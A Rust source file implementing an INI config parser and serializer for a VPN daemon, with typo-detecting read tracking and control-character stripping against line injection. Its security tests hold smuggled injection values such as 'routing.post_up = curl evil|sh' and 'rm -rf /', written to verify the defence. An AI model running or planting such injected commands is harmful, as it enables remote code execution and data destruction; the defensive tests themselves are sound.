//! Flat INI config format — one parser/serializer shared by the server and the
//! client config, replacing the previous two-schema (server TOML + client TOML)
//! split.
//!
//! The format is deliberately PHP-`parse_ini_file`-like: line oriented,
//! comment friendly, and order independent (no "all scalars must precede every
//! table" rule that TOML imposes — see the comments in `config/server.rs` about
//! the fragile serialization ordering this replaces).
//!
//! Grammar:
//! ```ini
//! ; comment            (';' or '#', whole-line only)
//!
//! [section]            singleton section
//! key = value
//! key = "quoted value" ; surrounding double-quotes are stripped
//! list = a, b, c       ; comma-separated; read back with Section::list()
//!
//! [profile:tcp]        repeatable section: kind "profile", instance "tcp"
//! bind = 0.0.0.0:443
//! ```
//!
//! A document is an ordered list of [`Section`]s. Sections with the same `kind`
//! but different `instance` are how arrays-of-tables (profiles, users) are
//! expressed without nesting. There is intentionally no sub-table nesting:
//! compound values are encoded on a single line (e.g. `tun = vpn0 10.0.0.1/24
//! mtu=1400`) and parsed by the consumer.
//!
//! This module is transport/OS independent (pure `std`), so it compiles and is
//! unit-tested on every platform even though the rest of the daemon is Linux
//! only.

/// One `[section]` (or `[kind:instance]`) block and its `key = value` entries,
/// in source order.
#[derive(Debug, Clone, Default)]
pub struct Section {
    /// The part before `:` in the header, e.g. `profile` in `[profile:tcp]`,
    /// or the whole name for a singleton like `[auth]`.
    pub kind: String,
    /// The part after `:`, e.g. `tcp` in `[profile:tcp]`. `None` for singletons.
    pub instance: Option<String>,
    /// `(key, value)` pairs, in source order. Duplicate keys are preserved
    /// (use [`Section::list`] / [`Section::all`] to read repeated keys).
    pub entries: Vec<(String, String)>,
    /// Every key some accessor has looked at, so [`Section::unread_keys`] can
    /// report the ones nothing ever asked for — i.e. typos. A misspelled key is
    /// not a parse error and never reaches `get()`, so without this the setting
    /// silently keeps its default (this is how `exclude_routes` looked like a
    /// working split-tunnel option for a long time).
    ///
    /// Interior mutability because every accessor takes `&self`. An `IniDoc` is
    /// short-lived — parsed, folded into the config structs, dropped — and is
    /// never stored in shared state, so `RefCell` (and the resulting `!Sync`)
    /// costs nothing here. Deliberately **not** part of the value: two sections
    /// with the same content are equal regardless of what has been read.
    read: std::cell::RefCell<std::collections::HashSet<String>>,
}

impl PartialEq for Section {
    fn eq(&self, other: &Self) -> bool {
        self.kind == other.kind && self.instance == other.instance && self.entries == other.entries
    }
}

impl Eq for Section {}

impl Section {
    pub fn new(kind: impl Into<String>, instance: Option<String>) -> Self {
        Self {
            kind: kind.into(),
            instance,
            entries: Vec::new(),
            read: Default::default(),
        }
    }

    /// Record that something asked for `key` (see the `read` field).
    fn mark_read(&self, key: &str) {
        self.read.borrow_mut().insert(key.to_string());
    }

    /// Keys present in the file that **no** accessor ever asked for. Almost
    /// always a typo or a key from a different section. Only meaningful once the
    /// config has been fully built from this document.
    pub fn unread_keys(&self) -> Vec<&str> {
        let read = self.read.borrow();
        let mut seen = std::collections::HashSet::new();
        self.entries
            .iter()
            .map(|(k, _)| k.as_str())
            .filter(|k| !read.contains(*k) && seen.insert(*k))
            .collect()
    }

    /// Entries whose key starts with `prefix`, as `(suffix, value)`, marking each
    /// one read.
    ///
    /// For dynamic key families — `pool.reservation.<user>`, `metadata.<key>` —
    /// where the full key is not known ahead of time, so `get()` cannot be used.
    /// Iterating `entries` directly works too but bypasses read-tracking, which
    /// makes every such key look like a typo to [`Section::unread_keys`]; go
    /// through here instead.
    pub fn entries_with_prefix<'a>(&'a self, prefix: &str) -> Vec<(&'a str, &'a str)> {
        let mut out = Vec::new();
        for (k, v) in &self.entries {
            if let Some(suffix) = k.strip_prefix(prefix) {
                self.mark_read(k);
                out.push((suffix, v.as_str()));
            }
        }
        out
    }

    /// `[kind]` or `[kind:instance]`, for diagnostics.
    pub fn header(&self) -> String {
        match &self.instance {
            Some(i) => format!("[{}:{}]", self.kind, i),
            None => format!("[{}]", self.kind),
        }
    }

    /// First value for `key`, or `None` if absent.
    pub fn get(&self, key: &str) -> Option<&str> {
        self.mark_read(key);
        self.entries
            .iter()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v.as_str())
    }

    /// First value for `key`, or `default` if absent or empty.
    pub fn get_or<'a>(&'a self, key: &str, default: &'a str) -> &'a str {
        match self.get(key) {
            Some(v) if !v.is_empty() => v,
            _ => default,
        }
    }

    /// First value for `key` if the key is *present* (even when empty), else
    /// `default`. Unlike [`get_or`], a present-but-empty value is returned as
    /// `""` rather than the default — required for a lossless serialize/parse
    /// round-trip where an empty field must survive.
    pub fn str_or<'a>(&'a self, key: &str, default: &'a str) -> &'a str {
        self.get(key).unwrap_or(default)
    }

    /// Every value recorded for `key` (in source order), honouring duplicate
    /// keys. Used where a key may legitimately repeat.
    pub fn all(&self, key: &str) -> Vec<&str> {
        self.mark_read(key);
        self.entries
            .iter()
            .filter(|(k, _)| k == key)
            .map(|(_, v)| v.as_str())
            .collect()
    }

    /// Comma-separated value parsed into a trimmed, non-empty list. Also folds
    /// in any repeated occurrences of `key`. `a, b ,c` -> `["a","b","c"]`.
    pub fn list(&self, key: &str) -> Vec<String> {
        let mut out = Vec::new();
        for raw in self.all(key) {
            for part in raw.split(',') {
                let t = part.trim();
                if !t.is_empty() {
                    out.push(t.to_string());
                }
            }
        }
        out
    }

    /// Parse the first value for `key` into `T`, or return `default` when the
    /// key is absent, empty, or fails to parse. A present-but-unparsable value is
    /// logged at warn (M-9) so a typo like `max_sessions = abc` doesn't silently
    /// fall back to the default (which for `max_sessions` means "unlimited").
    pub fn parse_or<T: std::str::FromStr>(&self, key: &str, default: T) -> T {
        match self.get(key) {
            Some(v) if !v.is_empty() => match v.parse() {
                Ok(parsed) => parsed,
                Err(_) => {
                    log::warn!(
                        "config: key '{}' has an unparsable value '{}'; using the default",
                        key,
                        v
                    );
                    default
                }
            },
            _ => default,
        }
    }

    /// Booleans accept `true/false`, `yes/no`, `on/off`, `1/0` (case
    /// insensitive). Anything else (or absent) yields `default`.
    ///
    /// An unrecognised value is LOUD, exactly like [`Self::parse_or`]. It used to be
    /// silent, and that is worse here than for a numeric key: several of these flags are
    /// security switches, and the default for a switch is "off". `kill_switch = maybe`
    /// (or `ture`) therefore disabled the kill-switch with nothing anywhere to say so —
    /// the operator reads their config, sees the line, and believes they are protected.
    /// The unread-key report cannot catch it either: the key WAS read, its value was not
    /// understood.
    pub fn bool_or(&self, key: &str, default: bool) -> bool {
        match self.get(key).map(|v| v.trim().to_ascii_lowercase()) {
            Some(v) => match v.as_str() {
                "true" | "yes" | "on" | "1" => true,
                "false" | "no" | "off" | "0" => false,
                _ => {
                    log::warn!(
                        "config: key '{}' has an unrecognised boolean '{}'; using the default \
                         ({}). Accepted: true/false, yes/no, on/off, 1/0",
                        key,
                        v,
                        default
                    );
                    default
                }
            },
            None => default,
        }
    }

    /// Append a `key = value` entry (builder style for serialization).
    pub fn set(&mut self, key: impl Into<String>, value: impl Into<String>) -> &mut Self {
        self.entries.push((key.into(), value.into()));
        self
    }
}

/// A parsed INI document: an ordered list of sections.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct IniDoc {
    pub sections: Vec<Section>,
}

impl IniDoc {
    pub fn new() -> Self {
        Self::default()
    }

    /// First section whose `kind` matches (instance ignored). Use for
    /// singletons like `[auth]` / `[qeli]`.
    pub fn section(&self, kind: &str) -> Option<&Section> {
        self.sections.iter().find(|s| s.kind == kind)
    }

    /// All sections of a given `kind`, in source order — the array-of-tables
    /// view (e.g. every `[profile:*]`).
    pub fn sections_of<'a>(&'a self, kind: &'a str) -> impl Iterator<Item = &'a Section> + 'a {
        self.sections.iter().filter(move |s| s.kind == kind)
    }

    pub fn push(&mut self, section: Section) {
        self.sections.push(section);
    }

    /// Every `(section header, key)` in the document that nothing ever read —
    /// i.e. misspelled or misplaced keys. Call this **after** the config has
    /// been built from this same document; on a fresh document everything looks
    /// unread. See [`Section::unread_keys`] for why this exists.
    pub fn unread_keys(&self) -> Vec<(String, &str)> {
        self.sections
            .iter()
            .flat_map(|s| s.unread_keys().into_iter().map(move |k| (s.header(), k)))
            .collect()
    }

    /// Parse INI text. Returns an error with a 1-based line number on malformed
    /// input (a `key = value` line outside any section, or a key line without
    /// `=`). Unknown keys are *not* an error here — schema validation is the
    /// consumer's job.
    pub fn parse(input: &str) -> Result<IniDoc, ParseError> {
        let mut doc = IniDoc::new();
        let mut current: Option<Section> = None;

        for (idx, raw) in input.lines().enumerate() {
            let lineno = idx + 1;
            let line = raw.trim();
            if line.is_empty() || line.starts_with(';') || line.starts_with('#') {
                continue;
            }

            if let Some(header) = line.strip_prefix('[') {
                let header = header.strip_suffix(']').ok_or(ParseError {
                    line: lineno,
                    msg: "section header missing closing ']'".into(),
                })?;
                // flush the previous section
                if let Some(sec) = current.take() {
                    doc.sections.push(sec);
                }
                let (kind, instance) = match header.split_once(':') {
                    Some((k, i)) => (k.trim().to_string(), Some(i.trim().to_string())),
                    None => (header.trim().to_string(), None),
                };
                if kind.is_empty() {
                    return Err(ParseError {
                        line: lineno,
                        msg: "empty section name".into(),
                    });
                }
                current = Some(Section::new(kind, instance));
                continue;
            }

            // key = value
            let (key, value) = line.split_once('=').ok_or(ParseError {
                line: lineno,
                msg: "expected 'key = value' or '[section]'".into(),
            })?;
            let key = key.trim().to_string();
            if key.is_empty() {
                return Err(ParseError {
                    line: lineno,
                    msg: "empty key".into(),
                });
            }
            let value = unquote(value.trim());

            match current.as_mut() {
                Some(sec) => sec.entries.push((key, value)),
                None => {
                    return Err(ParseError {
                        line: lineno,
                        msg: format!("key '{}' appears before any [section]", key),
                    })
                }
            }
        }

        if let Some(sec) = current.take() {
            doc.sections.push(sec);
        }
        Ok(doc)
    }
}

/// Serialize back to INI text. Values containing a leading/trailing space, a
/// `;`/`#`, or a `"` are double-quoted; everything else is emitted bare.
/// (`Display` → `.to_string()` works via the blanket `ToString` impl.)
impl std::fmt::Display for IniDoc {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        for (i, sec) in self.sections.iter().enumerate() {
            if i > 0 {
                writeln!(f)?;
            }
            match &sec.instance {
                Some(inst) => writeln!(
                    f,
                    "[{}:{}]",
                    sanitize_ident(&sec.kind),
                    sanitize_ident(inst)
                )?,
                None => writeln!(f, "[{}]", sanitize_ident(&sec.kind))?,
            }
            for (k, v) in &sec.entries {
                writeln!(f, "{} = {}", sanitize_ident(k), quote_if_needed(v))?;
            }
        }
        Ok(())
    }
}

/// A parse error carrying the 1-based source line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParseError {
    pub line: usize,
    pub msg: String,
}

impl std::fmt::Display for ParseError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "config parse error at line {}: {}", self.line, self.msg)
    }
}

impl std::error::Error for ParseError {}

/// Strip a single pair of surrounding double-quotes, if present, and undo the
/// `\"` escaping that [`quote_if_needed`] applies inside them. Quotes let a
/// value keep significant leading/trailing whitespace or a literal `;`/`#`/`"`.
/// This is the exact inverse of [`quote_if_needed`]: the serializer escapes only
/// `"` (never a bare backslash), so we un-escape only `\"` -> `"` and leave any
/// lone backslash untouched.
fn unquote(s: &str) -> String {
    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
        s[1..s.len() - 1].replace("\\\"", "\"")
    } else {
        s.to_string()
    }
}

/// SECURITY backstop for INI *structure*: section kinds/instances and keys.
///
/// [`quote_if_needed`] protects VALUES, but section headers and keys are emitted
/// bare, so a control character in a profile/group name (the `[profile:<name>]`
/// instance) or in a `metadata.<key>` would split the line and forge extra
/// `[section]` / `key = value` lines when the file is re-parsed — smuggling e.g.
/// `routing.post_up` (command execution via `/bin/sh -c`) past the API-level
/// guards that deliberately run BEFORE serialization. The INI grammar is
/// line-oriented with no continuations, so stripping ASCII control characters is
/// enough to close it; unlike values, a TAB has no place in a name/key either, so
/// strip that too. Names are also validated at the API boundary — this is the
/// fail-closed last line of defence for every caller that renders through
/// `to_ini_string`.
fn sanitize_ident(s: &str) -> std::borrow::Cow<'_, str> {
    if s.chars().any(|c| c.is_control()) {
        std::borrow::Cow::Owned(s.chars().filter(|c| !c.is_control()).collect())
    } else {
        std::borrow::Cow::Borrowed(s)
    }
}

pub(crate) fn quote_if_needed(s: &str) -> String {
    // SECURITY backstop. The INI grammar is line-oriented with no line-continuation,
    // so a control character (newline/CR/NUL/…) embedded in a value would split it
    // into forged extra `key = value` / `[section]` lines when the file is re-parsed —
    // an injection that could smuggle `routing.post_up` (root RCE) or
    // `[user:…]`/`password_hash` (auth bypass) past the struct-level guards that run
    // BEFORE serialization. No legitimate config value is multi-line, so we strip
    // ASCII control chars (TAB kept) as a fail-closed backstop for every caller that
    // renders through `to_ini_string`. Done first, before the quoting decision.
    let owned;
    let s: &str = if s.chars().any(|c| c.is_control() && c != '\t') {
        owned = s
            .chars()
            .filter(|&c| !c.is_control() || c == '\t')
            .collect::<String>();
        owned.as_str()
    } else {
        s
    };
    let needs = s.is_empty()
        || s.starts_with(' ')
        || s.ends_with(' ')
        || s.contains(';')
        || s.contains('#')
        || s.contains('"');
    if needs {
        format!("\"{}\"", s.replace('"', "\\\""))
    } else {
        s.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_singletons_and_instances() {
        let src = "\
; a comment
# another
[auth]
users_file = /etc/qeli/users.conf
require_client_key_proof = true

[profile:tcp]
bind = 0.0.0.0:443
push = 10.0.0.0/24, 192.168.50.0/24

[profile:udp]
bind = 0.0.0.0:443
mode = obfs
";
        let doc = IniDoc::parse(src).unwrap();
        let auth = doc.section("auth").unwrap();
        assert_eq!(auth.get("users_file"), Some("/etc/qeli/users.conf"));
        assert!(auth.bool_or("require_client_key_proof", false));

        let profiles: Vec<_> = doc.sections_of("profile").collect();
        assert_eq!(profiles.len(), 2);
        assert_eq!(profiles[0].instance.as_deref(), Some("tcp"));
        assert_eq!(
            profiles[0].list("push"),
            vec!["10.0.0.0/24", "192.168.50.0/24"]
        );
        assert_eq!(profiles[1].instance.as_deref(), Some("udp"));
        assert_eq!(profiles[1].get("mode"), Some("obfs"));
    }

    #[test]
    fn typed_accessors() {
        let src = "[s]\nport = 8443\nratio = 0.25\nmissing_default = \nflag = yes\n";
        let doc = IniDoc::parse(src).unwrap();
        let s = doc.section("s").unwrap();
        assert_eq!(s.parse_or::<u16>("port", 443), 8443);
        assert_eq!(s.parse_or::<u16>("absent", 443), 443);
        assert!((s.parse_or::<f64>("ratio", 0.0) - 0.25).abs() < 1e-9);
        // empty value falls back to default
        assert_eq!(s.parse_or::<u16>("missing_default", 7), 7);
        assert!(s.bool_or("flag", false));
    }

    #[test]
    fn quoting_round_trips() {
        let mut doc = IniDoc::new();
        let mut sec = Section::new("qeli", None);
        sec.set("pass", "p@ss; with semicolon")
            .set("plain", "value")
            .set("empty", "");
        doc.push(sec);
        let text = doc.to_string();
        let reparsed = IniDoc::parse(&text).unwrap();
        let s = reparsed.section("qeli").unwrap();
        assert_eq!(s.get("pass"), Some("p@ss; with semicolon"));
        assert_eq!(s.get("plain"), Some("value"));
        assert_eq!(s.get("empty"), Some(""));
    }

    #[test]
    fn serialize_strips_control_chars_blocks_injection() {
        // SECURITY: a value carrying a newline must not split into a forged extra
        // key/section when the serialized text is re-parsed.
        let mut doc = IniDoc::new();
        let mut sec = Section::new("profile", Some("x".to_string()));
        sec.set(
            "server_name",
            "cf.com\nrouting.post_up = curl evil|sh\n[user:evil]",
        );
        doc.push(sec);
        let text = doc.to_string();
        assert!(
            !text.lines().any(|l| {
                let t = l.trim_start();
                t.starts_with("routing.post_up") || t.starts_with("[user:")
            }),
            "control-char injection leaked a line: {text:?}"
        );
        let re = IniDoc::parse(&text).unwrap();
        assert_eq!(re.sections.len(), 1);
        let s = &re.sections[0];
        assert_eq!(s.entries.len(), 1);
        assert_eq!(
            s.get("server_name"),
            Some("cf.comrouting.post_up = curl evil|sh[user:evil]")
        );
    }

    #[test]
    fn serialize_strips_control_chars_in_names_and_keys() {
        // SECURITY: `quote_if_needed` only guards VALUES — but the section header
        // and the key are emitted bare. A newline in a section INSTANCE (i.e. a
        // profile/group name) or in a key (`metadata.<key>`) forges exactly the
        // same extra lines on re-parse. That matters because the web API restores
        // post_up/post_down from disk specifically so the panel can NEVER
        // introduce a hook; a name-borne newline would smuggle one past that guard
        // and get it run through `/bin/sh -c` on the next restart.
        let mut doc = IniDoc::new();
        let mut sec = Section::new(
            "profile",
            Some("tcp]\nrouting.post_up = curl evil|sh\n[profile:junk".to_string()),
        );
        sec.set("metadata.a\nrouting.post_down = rm -rf /", "v");
        doc.push(sec);
        let text = doc.to_string();
        assert!(
            !text.lines().any(|l| {
                let t = l.trim_start();
                t.starts_with("routing.post_up") || t.starts_with("routing.post_down")
            }),
            "name/key injection forged a hook line: {text:?}"
        );
        // The whole payload must collapse onto one header + one key line, and the
        // re-parsed config must carry no hook at all.
        let re = IniDoc::parse(&text).unwrap();
        assert_eq!(re.sections.len(), 1, "forged an extra section: {text:?}");
        assert!(
            re.sections[0].get("routing.post_up").is_none()
                && re.sections[0].get("routing.post_down").is_none(),
            "hook smuggled into the re-parsed config: {text:?}"
        );
    }

    #[test]
    fn embedded_quote_round_trips() {
        // A value containing a literal `"` (and one mixing `"` with `;`) must
        // survive serialize -> parse: quote_if_needed escapes `"` -> `\"`, so
        // unquote must un-escape it back. Regression test for the missing
        // inverse in the QUOTED branch of `unquote`.
        let mut doc = IniDoc::new();
        let mut sec = Section::new("qeli", None);
        sec.set("pass", "a\"b")
            .set("quote_and_semi", "say \"hi\"; now")
            .set("trailing_quote", "ab\"")
            .set("just_quote", "\"");
        doc.push(sec);
        let text = doc.to_string();
        let reparsed = IniDoc::parse(&text).unwrap();
        let s = reparsed.section("qeli").unwrap();
        assert_eq!(s.get("pass"), Some("a\"b"));
        assert_eq!(s.get("quote_and_semi"), Some("say \"hi\"; now"));
        assert_eq!(s.get("trailing_quote"), Some("ab\""));
        assert_eq!(s.get("just_quote"), Some("\""));
    }

    #[test]
    fn rejects_key_before_section() {
        let err = IniDoc::parse("orphan = 1\n").unwrap_err();
        assert_eq!(err.line, 1);
    }

    #[test]
    fn rejects_unterminated_header() {
        let err = IniDoc::parse("[auth\nkey = v\n").unwrap_err();
        assert_eq!(err.line, 1);
    }

    #[test]
    fn order_independent_no_value_before_table_rule() {
        // The exact pattern TOML rejected: a scalar after a "table" in the same
        // logical block. Here it's just another section — always valid.
        let src = "[profile:tcp]\nbind = 0.0.0.0:443\n[profile:tcp.nat]\nenabled = true\n[profile:tcp]\nmtu = 1400\n";
        let doc = IniDoc::parse(src).unwrap();
        assert_eq!(doc.sections_of("profile").count(), 3);
    }

    #[test]
    fn unread_keys_reports_only_what_nobody_asked_for() {
        let doc = IniDoc::parse("[qeli]\ngateway = true\nexclude_routes = 10.0.0.0/8\n").unwrap();
        let s = doc.section("qeli").unwrap();

        // Nothing consulted yet — every key looks unread.
        assert_eq!(s.unread_keys().len(), 2);

        // Read the keys the real parser knows about. `exclude` is absent from the
        // file, but asking marks it as known so it is not reported as a leftover.
        let _ = s.bool_or("gateway", false);
        let _ = s.list("exclude");

        // The misspelling survives: this is exactly the exclude_routes bug.
        assert_eq!(
            doc.unread_keys(),
            vec![("[qeli]".to_string(), "exclude_routes")]
        );
    }

    #[test]
    fn unread_keys_dedups_repeated_keys_and_names_the_section() {
        let doc = IniDoc::parse("[profile:tcp]\nlisten = 1\nlisten = 2\ntpyo = x\n").unwrap();
        let s = doc.section("profile").unwrap();
        let _ = s.all("listen");
        assert_eq!(
            doc.unread_keys(),
            vec![("[profile:tcp]".to_string(), "tpyo")]
        );
    }

    #[test]
    fn prefix_reads_count_as_read() {
        // Dynamic key families have no fixed name, so they cannot go through get().
        // Reading them via entries_with_prefix must still mark them, or every
        // reservation would be reported as a typo.
        let doc = IniDoc::parse(
            "[profile:tcp]\npool.reservation.alice = 10.0.0.5\npool.reservation.bob = 10.0.0.6\nnope = 1\n",
        )
        .unwrap();
        let s = doc.section("profile").unwrap();
        let got = s.entries_with_prefix("pool.reservation.");
        assert_eq!(got, vec![("alice", "10.0.0.5"), ("bob", "10.0.0.6")]);
        assert_eq!(
            doc.unread_keys(),
            vec![("[profile:tcp]".to_string(), "nope")]
        );
    }

    #[test]
    fn read_tracking_does_not_affect_equality() {
        let a = IniDoc::parse("[qeli]\nmtu = 0\n").unwrap();
        let b = IniDoc::parse("[qeli]\nmtu = 0\n").unwrap();
        let _ = a.section("qeli").unwrap().get("mtu");
        assert_eq!(a, b, "reads must not change the value of a document");
    }
}
